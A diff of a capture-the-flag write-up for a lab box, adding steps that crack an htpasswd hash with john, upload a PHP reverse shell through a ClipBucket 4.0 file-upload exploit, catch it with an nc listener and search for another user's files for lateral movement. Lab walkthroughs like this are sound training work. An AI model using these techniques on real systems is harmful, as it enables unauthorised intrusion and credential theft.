@@ -28,10 +28,28 @@ developers:$apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0
 ```
 
 the username is developers and the `md5crypt` hash is to the right
-use to john to crack the hash 
+use john to crack the hash 
 ```sh
 john hash --wordlist=/usr/share/wordlists/rockyou.txt
 ```
+### Revshell
+
+- on accessing the website `broadcast.vulnnet.thm` we see that it uses `clipbucket 4.0`
+- This version has a exploit available on `searchsploit`, we can upload a file without authentication
+Follow the instructions in the exploit and upload a php revshell 
+
+Open a listener (`nc -nlvp 4444`) and browse the uploaded shell `http://developers:9972761drmfsls@broadcast.vulnnet.thm/actions/CB_BEATS_UPLOAD_DIR/1620367741f6065c.php`.
+### Lateral movement
+
+- Lateral movement from www-data > server-management
+Checking the `/home` folder, as well as the `/etc/passwd` file will confirm the existence of a `server-management` user.
+
+Let’s check what files are owned by this user [[Find]]
+```
+find / -type f -user server-management -exec ls -l {} + 2>/dev/null
+```
+
+this user owns a zip file in the `/var/backup` directory 
 
 
 
